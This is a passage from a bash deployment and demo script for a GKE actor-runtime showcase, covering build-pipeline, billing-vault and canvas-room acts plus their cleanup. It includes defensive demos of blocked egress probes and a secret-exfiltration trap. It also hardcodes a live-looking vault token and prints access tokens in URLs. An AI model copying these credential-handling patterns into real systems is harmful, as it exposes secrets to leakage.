    cert_name="${SLIDES_CERT_NAME:-${slug}-cert}"
    entry_name="${SLIDES_CERT_ENTRY_NAME:-${slug}-entry}"

    if ! gcloud certificate-manager certificates describe "${cert_name}" --location=global --project="${PROJECT_ID}" --quiet >/dev/null 2>&1; then
      echo "Creating Certificate Manager managed certificate '${cert_name}' for ${SLIDES_DOMAIN}..."
      gcloud certificate-manager certificates create "${cert_name}" \
        --domains="${SLIDES_DOMAIN}" \
        --location=global \
        --project="${PROJECT_ID}" \
        --async \
        --quiet
    fi
    if ! gcloud certificate-manager maps entries describe "${entry_name}" --map="${CERT_MAP_NAME}" --location=global --project="${PROJECT_ID}" --quiet >/dev/null 2>&1; then
      echo "Attaching certificate '${cert_name}' to Certificate Map '${CERT_MAP_NAME}' for ${SLIDES_DOMAIN}..."
      gcloud certificate-manager maps entries create "${entry_name}" \
        --map="${CERT_MAP_NAME}" \
        --hostname="${SLIDES_DOMAIN}" \
        --certificates="${cert_name}" \
        --location=global \
        --project="${PROJECT_ID}" \
        --async \
        --quiet
    fi
  fi

  local gw_ip=""
  for _ in {1..45}; do
    gw_ip="$(kubectl get gateway anything-but-agents-gateway -n anything-but-agents -o jsonpath='{.status.addresses[0].value}' 2>/dev/null || true)"
    if [[ -n "${gw_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Gateway IP (${GATEWAY_IP_NAME}) : ${gw_ip:-<provisioning>}"
  echo "  0. Slides Presentation Deck  : https://${SLIDES_DOMAIN}/deck"
  echo "  1. Dungeon 2D Roguelike      : https://dungeon.${DEMO_DOMAIN}/play  (Public QR Game)"
  echo "     Dungeon 2D Dashboard      : https://dungeon.${DEMO_DOMAIN}/dashboard"
  echo "  2. Cold-Start HPA Race       : https://coldstart.${DEMO_DOMAIN}/dashboard"
  echo "  3. TenantDB Storage X-Ray    : https://tenantdb.${DEMO_DOMAIN}/dashboard"
  echo "  4. Truman Show Honeypot      : https://honeypot.${DEMO_DOMAIN}/"
  echo "  5. Chronos Time-Warp Lab     : https://timewarp.${DEMO_DOMAIN}/dashboard"
  echo "  6. Hermetic Build Pipeline   : https://buildbox.${DEMO_DOMAIN}/dashboard"
  echo "  7. 30-Day Billing & Escrow   : https://billing.${DEMO_DOMAIN}/dashboard"
  echo "  8. Multiplayer Canvas Rooms  : https://canvas.${DEMO_DOMAIN}/dashboard"
  echo "     Fallback Token Query      : ?key=\$(kubectl get secret presenter-auth -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

cleanup_gateway_tls() {
  banner "Cleaning up GKE Gateway API + HTTPRoutes"
  envsubst < "${REPO_ROOT}/manifests/gateway-tls.yaml.tmpl" | kubectl delete --ignore-not-found -f -
}

cleanup_timewarp_gateway() {
  banner "Cleaning up Time-Warp Gateway Deployment & Actors"
  for act in raft-leader-1 raft-node-1 raft-node-2 raft-node-3; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount timewarp-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding timewarp-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding timewarp-gateway-ate-client --ignore-not-found
  free_workers '^raft-'
}

act6_buildbox() {
  ensure_router_port_forward
  banner "ACT VI: 'The 3-Stage Hermetic CI/CD Build Pipeline' — Dynamic ActorEgressPolicy Hot-Swap"
  reset_act_resources build-pr-104 build-release-v2 build-hotfix-88

  local bb_port="${BUILDBOX_PORT:-8087}"
  local bb_url="http://localhost:${bb_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret buildbox-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  cluster_lb_ip="$(kubectl get svc buildbox-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    bb_url="http://${cluster_lb_ip}"
    echo "Using in-cluster Buildbox Hermetic Pipeline Gateway at ${bb_url}..."
  else
    echo "Starting Buildbox Hermetic Pipeline Gateway on ${bb_url}..."
    (
      cd "${REPO_ROOT}"
      PRESENTER_TOKEN="${presenter_token}" go run ./cmd/buildbox \
        --mode=gateway \
        --addr=":${bb_port}" \
        --atespace="${ATESPACE}" \
        --template=buildbox \
        --router-url="${ROUTER_URL}" >/dev/null 2>&1
    ) &
    BUILDBOX_GW_PID=$!
    trap 'kill "${PORT_FORWARD_PID:-}" "${BUILDBOX_GW_PID:-}" 2>/dev/null || true' EXIT
  fi

  echo ""
  if [[ -n "${presenter_token}" ]]; then
    echo "  Hermetic Build Pipeline UI : ${bb_url}/?key=${presenter_token}"
  else
    echo "  Hermetic Build Pipeline UI : ${bb_url}/"
  fi
  echo ""

  step "1. Create stateful build runner actor 'build-pr-104' and attach Phase 1 EgressPolicy (allowing package mirror only)"
  run_cmd kubectl ate create actor build-pr-104 -a "${ATESPACE}" --template buildbox
  run_cmd curl -fsS -X POST "${bb_url}/api/build/fetch-deps" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"job_name":"build-pr-104"}'

  step "2. Lock ActorEgressPolicy to Total Airgap (0 allowed rules) & compile hermetically from in-memory Go heap RAM"
  run_cmd curl -fsS -X POST "${bb_url}/api/build/compile-test" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"job_name":"build-pr-104"}'

  step "3. Trigger 3 rogue egress probes (external telemetry, compile-time mirror fetch, link-local metadata) -> 100% BLOCKED"
  run_cmd curl -fsS -X POST "${bb_url}/api/build/test-rogue" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"job_name":"build-pr-104"}'

  step "4. Update EgressPolicy to allow registry upload only, publish signed release & SBOM, then cleanly suspend to GCS"
  run_cmd curl -fsS -X POST "${bb_url}/api/build/publish" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"job_name":"build-pr-104"}'
  run_cmd kubectl ate suspend actor build-pr-104 -a "${ATESPACE}" --mode=sync

  if [[ "${PAUSE_BETWEEN_STEPS}" == "1" ]]; then
    echo ""
    echo ">>> Buildbox Hermetic Pipeline UI (${bb_url}) is still live!"
    read -r -p "    [Press Enter when finished exploring the browser UI] " _
  fi

  kill "${BUILDBOX_GW_PID:-}" 2>/dev/null || true
  free_workers '^build-'
}

deploy_buildbox_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Buildbox Hermetic Pipeline Gateway & LoadBalancer"
  reset_act_resources build-pr-104 build-release-v2 build-hotfix-88
  free_workers '^build-'

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  ensure_router_ingress_spiffe_ids
  ensure_presenter_auth
  ensure_template_ready buildbox
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/buildbox-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/buildbox-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc buildbox-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Buildbox Hermetic Pipeline UI (HTTPS) : https://buildbox.${DEMO_DOMAIN}/?key=\$(kubectl get secret buildbox-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Buildbox Hermetic Pipeline UI (LB IP) : http://${lb_ip:-<pending>}/?key=\$(kubectl get secret buildbox-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

cleanup_buildbox_gateway() {
  banner "Cleaning up Buildbox Gateway Deployment & Actors"
  for act in build-pr-104 build-release-v2 build-hotfix-88; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
    kubectl ate delete egress-policy "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount buildbox-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding buildbox-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding buildbox-gateway-ate-client --ignore-not-found
  free_workers '^build-'
}

run_all_acts() {
  ensure_router_port_forward
  act0_slides
  act1_dungeon
  act1b_dungeon2d
  act2_coldstart
  act3_tenantdb
  act4_honeypot
  act5_timewarp
  act6_buildbox
  act7_billing
  act8_canvas
}

act7_billing() {
  ensure_router_port_forward
  banner "ACT VII: 'The 30-Day Sleeping Subscription Billing & Escrow Engine' — Zero-Secret Memory Snapshots & Live Secret Rotation"
  reset_act_resources sub-acme sub-globex sub-initech

  local bl_port="${BILLING_PORT:-8088}"
  local bl_url="http://localhost:${bl_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret billing-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  cluster_lb_ip="$(kubectl get svc billing-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    bl_url="http://${cluster_lb_ip}"
    echo "Using in-cluster Billing Vault Console Gateway at ${bl_url}..."
  fi

  echo ""
  echo "  Billing Vault Console UI : ${bl_url}/dashboard?key=${presenter_token}"
  echo ""

  step "1. Reset vault to v1 and settle Cycle #1 ($5,000 USD) for 'sub-acme' (ate-secret:// + actorJwt injected on the wire)"
  run_cmd curl -fsS -X POST "${bl_url}/api/reset" -H "X-Presenter-Key: ${presenter_token}"
  run_cmd curl -fsS -X POST "${bl_url}/api/subscription/settle" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"actor_name":"sub-acme"}'

  step "2. Inspect 'sub-acme' Go heap RAM & environment -> 0 raw secrets in actor memory or GCS snapshot"
  run_cmd curl -fsS "${bl_url}/api/subscription/inspect-memory?actor=sub-acme" -H "X-Presenter-Key: ${presenter_token}"

  step "3. Rotate Kubernetes Secret (v1 -> v2) while 'sub-acme' is sleeping in GCS, then settle Cycle #2 (receives v2 key automatically!)"
  run_cmd curl -fsS -X POST "${bl_url}/api/vault/rotate" -H "X-Presenter-Key: ${presenter_token}"
  run_cmd curl -fsS -X POST "${bl_url}/api/subscription/settle" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"actor_name":"sub-acme"}'

  step "4. Run Host-Binding Exfiltration Trap against untrusted-echo -> inert ate-secret:// URI received (0 secrets leaked)"
  run_cmd curl -fsS -X POST "${bl_url}/api/subscription/test-exfiltrate" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"actor_name":"sub-acme"}'

  free_workers '^sub-'
}

act8_canvas() {
  ensure_router_port_forward
  banner "ACT VIII: 'Multiplayer Collaborative Canvas & Document Rooms' — OpenFGA AccessPolicy Perimeter Authorization"
  reset_act_resources doc-merger-acquisition doc-q4-roadmap doc-incident-postmortem

  local cv_port="${CANVAS_PORT:-8089}"
  local cv_url="http://localhost:${cv_port}"
  local cluster_lb_ip=""
  local presenter_token=""
  presenter_token="$(kubectl get secret canvas-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' 2>/dev/null | base64 -d || true)"
  cluster_lb_ip="$(kubectl get svc canvas-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"

  if [[ -n "${cluster_lb_ip}" ]] && curl -s -o /dev/null --connect-timeout 2 "http://${cluster_lb_ip}/readyz" 2>/dev/null; then
    cv_url="http://${cluster_lb_ip}"
    echo "Using in-cluster Canvas Collaborative Document Rooms Gateway at ${cv_url}..."
  fi

  echo ""
  echo "  Canvas Document Rooms UI : ${cv_url}/dashboard?key=${presenter_token}"
  echo ""

  step "1. Unauthorized principal 'user:charlie' attempts to open sleeping 'doc-merger-acquisition' -> 403 Denied at Perimeter (Actor NOT Woken)"
  run_cmd curl -s -H "X-Presenter-Key: ${presenter_token}" "${cv_url}/api/state?principal=user:charlie&doc=doc-merger-acquisition"

  step "2. Owner 'user:alice' opens 'doc-merger-acquisition' (wakes actor from GCS) and grants 'viewer' tuple to 'user:charlie'"
  run_cmd curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${cv_url}/api/state?principal=user:alice&doc=doc-merger-acquisition"
  run_cmd curl -fsS -X POST "${cv_url}/api/policy/grant" -H "X-Presenter-Key: ${presenter_token}" -H "Content-Type: application/json" -d '{"principal":"user:alice","target_user":"user:charlie","role":"viewer","doc_id":"doc-merger-acquisition"}'

  step "3. 'user:charlie' can now view 'doc-merger-acquisition' (200 OK), while mutations remain blocked"
  run_cmd curl -fsS -H "X-Presenter-Key: ${presenter_token}" "${cv_url}/api/state?principal=user:charlie&doc=doc-merger-acquisition"

  free_workers '^doc-'
}

deploy_billing_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Billing Subscription & Egress Credential Vault Gateway & LoadBalancer"
  reset_act_resources sub-acme sub-globex sub-initech
  free_workers '^sub-'

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  ensure_router_ingress_spiffe_ids
  ensure_credential_provider_namespace_policy
  ensure_presenter_auth

  kubectl create secret generic billing-vault-api \
    -n anything-but-agents \
    --from-literal=token="sk_live_vault_v1_8f92a14c6e0b7d3a" \
    --dry-run=client -o yaml | kubectl apply -f - >/dev/null

  ensure_template_ready billing
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/billing-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/billing-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc billing-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Billing Vault Console (HTTPS) : https://billing.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret billing-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Billing Vault Console (LB IP) : http://${lb_ip:-<pending>}/dashboard?key=\$(kubectl get secret billing-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

cleanup_billing_gateway() {
  banner "Cleaning up Billing Gateway Deployment & Actors"
  for act in sub-acme sub-globex sub-initech; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
    kubectl ate delete egress-policy "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount billing-gateway -n anything-but-agents --ignore-not-found
  kubectl delete service untrusted-echo -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding billing-gateway-secret-rotator -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding billing-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding billing-gateway-ate-client --ignore-not-found
  free_workers '^sub-'
}

deploy_canvas_gateway() {
  detect_cluster_defaults
  banner "Deploying In-Cluster Canvas Collaborative Document Rooms Gateway & LoadBalancer"

  kubectl ate create atespace "${ATESPACE}" 2>/dev/null || true
  reset_act_resources doc-merger-acquisition doc-q4-roadmap doc-incident-postmortem
  free_workers '^doc-'
  ensure_router_ingress_spiffe_ids
  ensure_presenter_auth

  ensure_template_ready canvas
  resolve_kubectl_ate_image

  (
    cd "${REPO_ROOT}"
    envsubst < "manifests/canvas-gateway.yaml.tmpl" \
      | ko resolve --platform=linux/amd64 -f - \
      | kubectl apply -f -
  )
  kubectl rollout status deployment/canvas-gateway -n anything-but-agents --timeout=120s

  local lb_ip=""
  for _ in {1..30}; do
    lb_ip="$(kubectl get svc canvas-gateway -n anything-but-agents -o jsonpath='{.status.loadBalancer.ingress[0].ip}' 2>/dev/null || true)"
    if [[ -n "${lb_ip}" ]]; then
      break
    fi
    sleep 2
  done

  echo ""
  echo "  Canvas Document Rooms (HTTPS) : https://canvas.${DEMO_DOMAIN}/dashboard?key=\$(kubectl get secret canvas-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo "  Canvas Document Rooms (LB IP) : http://${lb_ip:-<pending>}/dashboard?key=\$(kubectl get secret canvas-gateway -n anything-but-agents -o jsonpath='{.data.PRESENTER_TOKEN}' | base64 -d)"
  echo ""
}

cleanup_canvas_gateway() {
  banner "Cleaning up Canvas Gateway Deployment & Actors"
  for act in doc-merger-acquisition doc-q4-roadmap doc-incident-postmortem; do
    kubectl ate delete actor "${act}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl delete deployment,service,secret,serviceaccount canvas-gateway -n anything-but-agents --ignore-not-found
  kubectl delete role,rolebinding canvas-gateway-token-minter -n ate-system --ignore-not-found
  kubectl delete clusterrole,clusterrolebinding canvas-gateway-ate-client --ignore-not-found
  free_workers '^doc-'
}

cleanup_all() {
  banner "Cleaning up 'Anything But Agents' resources"
  cleanup_slides_gateway
  cleanup_dungeon2d_gateway
  cleanup_coldstart_hpa
  cleanup_tenantdb_gateway
  cleanup_honeypot_gateway
  cleanup_timewarp_gateway
  cleanup_buildbox_gateway
  cleanup_billing_gateway
  cleanup_canvas_gateway
  cleanup_gateway_tls
  kubectl delete configmap,secret presenter-auth -n anything-but-agents --ignore-not-found
  for actor in hero-mofi hero-timeline-b d2d-mofi d2d-mofi-timeline-b clone-1 clone-2 clone-3 coldstart-1 coldstart-2 coldstart-3 db-acme db-globex db-initech db-umbrella honeypot-203-0-113-5 honeypot-198-51-100-9 honeypot-forensic-lab raft-leader-1 raft-node-1 raft-node-2 raft-node-3 build-pr-104 build-release-v2 build-hotfix-88 sub-acme sub-globex sub-initech doc-merger-acquisition doc-q4-roadmap doc-incident-postmortem; do
    kubectl ate delete actor "${actor}" -a "${ATESPACE}" 2>/dev/null || true
  done
  for i in 01 02 03 04 05 06 07 08 09 10 11 12 13 14 15 16; do
    kubectl ate delete actor "slide-${i}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl ate delete tag before-dragon -a "${ATESPACE}" 2>/dev/null || true
  kubectl ate delete tag tag-honeypot-forensic -a "${ATESPACE}" 2>/dev/null || true
  kubectl delete secret payroll-vault-api billing-vault-api -n anything-but-agents --ignore-not-found
  for tmpl in slides dungeon dungeon2d coldstart tenantdb tenantdb-volumes honeypot timewarp buildbox billing canvas; do
    kubectl ate delete actor-template "${tmpl}" -a "${ATESPACE}" 2>/dev/null || true
  done
  kubectl ate delete atespace "${ATESPACE}" 2>/dev/null || true
  kubectl delete namespace anything-but-agents --ignore-not-found
}

case "${1:-}" in
  bootstrap-gke)         bootstrap_gke ;;
  upgrade-substrate)     upgrade_substrate ;;
  deploy)                deploy_all ;;
  deploy-slides)         deploy_slides_gateway ;;
  cleanup-slides)        cleanup_slides_gateway ;;
  deploy-dungeon2d)      deploy_dungeon2d_gateway ;;
  reset-dungeon2d)       reset_dungeon2d_actors ;;
  cleanup-dungeon2d)     cleanup_dungeon2d_gateway ;;
  deploy-coldstart-hpa)  deploy_coldstart_hpa ;;
  cleanup-coldstart-hpa) cleanup_coldstart_hpa ;;
  deploy-tenantdb)       deploy_tenantdb_gateway ;;
  cleanup-tenantdb)      cleanup_tenantdb_gateway ;;
  deploy-honeypot)       deploy_honeypot_gateway ;;
  cleanup-honeypot)      cleanup_honeypot_gateway ;;
  deploy-timewarp)       deploy_timewarp_gateway ;;
  cleanup-timewarp)      cleanup_timewarp_gateway ;;
  deploy-buildbox)       deploy_buildbox_gateway ;;
  cleanup-buildbox)      cleanup_buildbox_gateway ;;
  deploy-billing)        deploy_billing_gateway ;;
  cleanup-billing)       cleanup_billing_gateway ;;
  deploy-canvas)         deploy_canvas_gateway ;;
  cleanup-canvas)        cleanup_canvas_gateway ;;
  deploy-gateway-tls)    deploy_gateway_tls ;;
  cleanup-gateway-tls)   cleanup_gateway_tls ;;
  run-all)               run_all_acts ;;
  act0-slides)           act0_slides ;;
  act1-dungeon)          act1_dungeon ;;
  act1b-dungeon2d)       act1b_dungeon2d ;;
  act2-coldstart)        act2_coldstart ;;
  act3-tenantdb)         act3_tenantdb ;;
  act4-honeypot)         act4_honeypot ;;
  act5-timewarp)         act5_timewarp ;;
  act6-buildbox)         act6_buildbox ;;
  act7-billing)          act7_billing ;;
  act8-canvas)           act8_canvas ;;
  cleanup)               cleanup_all ;;
  *)
    echo "Usage: $0 {bootstrap-gke|upgrade-substrate|deploy|deploy-slides|cleanup-slides|deploy-dungeon2d|reset-dungeon2d|cleanup-dungeon2d|deploy-coldstart-hpa|cleanup-coldstart-hpa|deploy-tenantdb|cleanup-tenantdb|deploy-honeypot|cleanup-honeypot|deploy-timewarp|cleanup-timewarp|deploy-buildbox|cleanup-buildbox|deploy-billing|cleanup-billing|deploy-canvas|cleanup-canvas|deploy-gateway-tls|cleanup-gateway-tls|run-all|act0-slides|act1-dungeon|act1b-dungeon2d|act2-coldstart|act3-tenantdb|act4-honeypot|act5-timewarp|act6-buildbox|act7-billing|act8-canvas|cleanup}" >&2
    exit 1
    ;;
esac
